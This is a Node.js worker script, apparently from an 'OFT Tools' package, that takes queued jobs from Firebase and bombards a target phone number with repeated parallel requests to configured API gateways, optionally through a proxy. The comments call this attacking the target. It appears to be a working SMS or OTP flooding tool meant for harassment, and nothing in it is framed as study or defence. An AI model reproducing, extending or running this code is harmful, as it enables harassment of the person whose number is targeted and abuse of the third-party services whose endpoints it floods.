/**
 * OFT TOOLS - CLOUD WORKER BOT
 * -----------------------------
 * This script runs on a server (VPS, Replit, Heroku, Railway) to process
 * attacks 24/7 without keeping the browser open.
 * 
 * SETUP:
 * 1. Go to Firebase Console > Project Settings > Service Accounts.
 * 2. Click "Generate new private key".
 * 3. Save the file as 'serviceAccountKey.json' in this folder.
 * 4. Run `npm install`
 * 5. Run `node bot.js`
 */

const admin = require("firebase-admin");
const fetch = require("node-fetch");
const fs = require("fs");

// Load Service Account Key
if (!fs.existsSync("./serviceAccountKey.json")) {
    console.error("❌ ERROR: serviceAccountKey.json not found!");
    console.error("-> Please download it from Firebase Console > Project Settings > Service Accounts");
    process.exit(1);
}

const serviceAccount = require("./serviceAccountKey.json");

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const db = admin.firestore();

console.log("🚀 OFT Cloud Engine Started...");
console.log("📡 Listening for queued tasks...");

// Listen for new tasks in real-time
db.collection("active_sessions")
  .where("status", "==", "queued")
  .onSnapshot(snapshot => {
    snapshot.docChanges().forEach(async (change) => {
      if (change.type === "added") {
        const session = change.doc.data();
        const sessionId = change.doc.id;
        console.log(`\n[+] New Job Detected: ${session.target} (${session.amount})`);
        await processJob(sessionId, session);
      }
    });
  }, err => {
    console.error(`❌ Listener Error: ${err}`);
  });

async function processJob(sessionId, session) {
    // 1. Mark as Running
    await db.collection("active_sessions").doc(sessionId).update({
        status: "running",
        mode: "cloud-worker",
        lastUpdate: new Date()
    });

    // 2. Load Config & Nodes
    const settingsDoc = await db.collection("system_config").doc("settings").get();
    const proxyUrl = settingsDoc.exists ? (settingsDoc.data().proxyUrl || "") : "";

    const nodesSnap = await db.collection("api_nodes").get();
    // Filter nodes that are explicitly disabled
    const nodes = nodesSnap.docs.map(doc => doc.data()).filter(n => n.enabled !== false);

    if (nodes.length === 0) {
        console.log("⚠️ No active API Nodes found. Stopping job.");
        await db.collection("active_sessions").doc(sessionId).update({ status: "stopped" });
        return;
    }

    let sent = 0;
    let failed = 0;
    const rawPhone = session.target.replace(/^(\+88|88)/, ''); 

    console.log(`⚡ Attacking ${session.target} with ${nodes.length} gateways...`);

    // 3. Attack Loop
    for (let i = 0; i < session.amount; i++) {
        // Check stop signal every 5 requests
        if (i % 5 === 0) {
            const currentSnap = await db.collection("active_sessions").doc(sessionId).get();
            if (currentSnap.data().status === 'stopped') {
                console.log("🛑 Job stopped by user.");
                return;
            }
        }

        // Run all nodes in parallel
        await Promise.all(nodes.map(async (node) => {
            try {
                let url = node.url
                    .replace(/{phone}/g, rawPhone)
                    .replace(/{phone_88}/g, `88${rawPhone}`)
                    .replace(/{phone_p88}/g, `+88${rawPhone}`);
                
                let body = node.body
                    .replace(/{phone}/g, rawPhone)
                    .replace(/{phone_88}/g, `88${rawPhone}`)
                    .replace(/{phone_p88}/g, `+88${rawPhone}`);

                let headers = {};
                try { headers = JSON.parse(node.headers); } catch (e) {}

                const isGet = node.method === 'GET';
                
                // Construct URL (with proxy if set)
                let finalUrl = url;
                if (proxyUrl) {
                     finalUrl = `${proxyUrl}${encodeURIComponent(url)}`;
                }

                const res = await fetch(finalUrl, {
                    method: node.method,
                    headers: headers,
                    body: !isGet ? body : undefined,
                });

                if (res.ok) sent++; else failed++;

            } catch (e) {
                failed++;
            }
        }));

        // Update Progress in DB every 10 loops to save writes
        if (i % 10 === 0) {
             await db.collection("active_sessions").doc(sessionId).update({
                 sent, failed, lastUpdate: new Date()
             });
             process.stdout.write(`\rProgress: ${sent} Sent / ${failed} Failed`);
        }
        
        // Slight delay to prevent crashing the worker
        await new Promise(r => setTimeout(r, 200));
    }

    // 4. Complete
    console.log(`\n✅ Job Completed for ${session.target}`);
    await db.collection("active_sessions").doc(sessionId).update({
        status: "completed",
        sent,
        failed,
        lastUpdate: new Date()
    });
}